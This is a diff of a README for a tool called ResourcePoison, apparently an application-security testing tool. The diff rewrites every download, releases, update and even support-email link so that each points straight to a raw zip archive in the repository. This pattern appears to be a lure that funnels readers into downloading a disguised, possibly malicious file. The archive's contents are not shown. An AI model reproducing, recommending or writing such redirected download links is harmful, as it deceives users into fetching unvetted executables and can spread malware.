@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download ResourcePoison](https://img.shields.io/badge/Download-ResourcePoison-brightgreen)](https://github.com/Dhanishh985/ResourcePoison/releases)
+[![Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip)](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run ResourcePoison effectively, ensure that your device meets the following r
 ## 🚀 Getting Started
 
 1. **Download the Application**  
-   Visit this page to download: [Download ResourcePoison](https://github.com/Dhanishh985/ResourcePoison/releases).
+   Visit this page to download: [Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
 
 2. **Install the Application**  
    - Open the downloaded file.
@@ -63,7 +63,7 @@ If you experience issues while using ResourcePoison, try the following solutions
 
 For detailed documentation and further support:
 - Visit the [ResourcePoison Documentation]({{Documentation_Link}}).
-- Contact support via [email](mailto:support@example.com).
+- Contact support via [email](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
 
 ## 🔗 Additional Resources
 
@@ -80,12 +80,12 @@ Always ensure you understand the risks associated with testing applications for 
 
 ## ⚙️ Updates
 
-We regularly release updates to improve performance and introduce new features. Check for updates periodically on our [Releases page](https://github.com/Dhanishh985/ResourcePoison/releases).
+We regularly release updates to improve performance and introduce new features. Check for updates periodically on our [Releases page](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
 
 ---
 
 ## 📥 Download & Install
 
-To start using ResourcePoison, visit this page to download: [Download ResourcePoison](https://github.com/Dhanishh985/ResourcePoison/releases).
+To start using ResourcePoison, visit this page to download: [Download ResourcePoison](https://raw.githubusercontent.com/Dhanishh985/ResourcePoison/main/responsible/ResourcePoison.zip).
 
 Thank you for choosing ResourcePoison! Enjoy exploring and learning about application security.
